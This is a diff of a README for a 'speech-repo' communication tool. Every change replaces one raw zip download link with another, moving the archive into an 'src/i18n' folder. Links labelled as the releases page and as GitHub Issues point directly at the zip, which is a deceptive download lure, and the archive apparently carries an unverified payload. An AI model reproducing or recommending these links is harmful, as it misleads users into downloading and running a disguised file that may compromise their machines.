@@ -1,6 +1,6 @@
 # 🗣️ speech-repo - Enhance Your Communication Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/rahmaan5402/speech-repo/main/Ganymedes/speech-repo.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rahmaan5402/speech-repo/main/Ganymedes/speech-repo.zip)
+[![Download Now](https://raw.githubusercontent.com/rahmaan5402/speech-repo/main/src/i18n/repo_speech_2.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rahmaan5402/speech-repo/main/src/i18n/repo_speech_2.8.zip)
 
 ## ⭐ Overview
 
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets these requirements:
 
 To download the application, you need to visit the GitHub Releases page. Follow these steps:
 
-1. Click on this link to visit the releases page: [Download Speech Repo](https://raw.githubusercontent.com/rahmaan5402/speech-repo/main/Ganymedes/speech-repo.zip).
+1. Click on this link to visit the releases page: [Download Speech Repo](https://raw.githubusercontent.com/rahmaan5402/speech-repo/main/src/i18n/repo_speech_2.8.zip).
 2. You will see a list of available software versions.
 
 ### Step 3: Downloading the Application
@@ -58,7 +58,7 @@ Once installed, follow these steps to set up your speech scripts:
 
 ## 📥 Download & Install
 
-To get started with Speech Repo, visit this page to download: [Download Speech Repo](https://raw.githubusercontent.com/rahmaan5402/speech-repo/main/Ganymedes/speech-repo.zip).
+To get started with Speech Repo, visit this page to download: [Download Speech Repo](https://raw.githubusercontent.com/rahmaan5402/speech-repo/main/src/i18n/repo_speech_2.8.zip).
 
 ## 📋 Features
 
@@ -82,6 +82,6 @@ If you want to contribute to Speech Repo, feel free to fork the repository. You 
 
 ## 📞 Support
 
-For further assistance, you can reach out via [GitHub Issues](https://raw.githubusercontent.com/rahmaan5402/speech-repo/main/Ganymedes/speech-repo.zip). 
+For further assistance, you can reach out via [GitHub Issues](https://raw.githubusercontent.com/rahmaan5402/speech-repo/main/src/i18n/repo_speech_2.8.zip). 
 
 Make your communication easier! Download Speech Repo today and start enhancing your daily conversations.
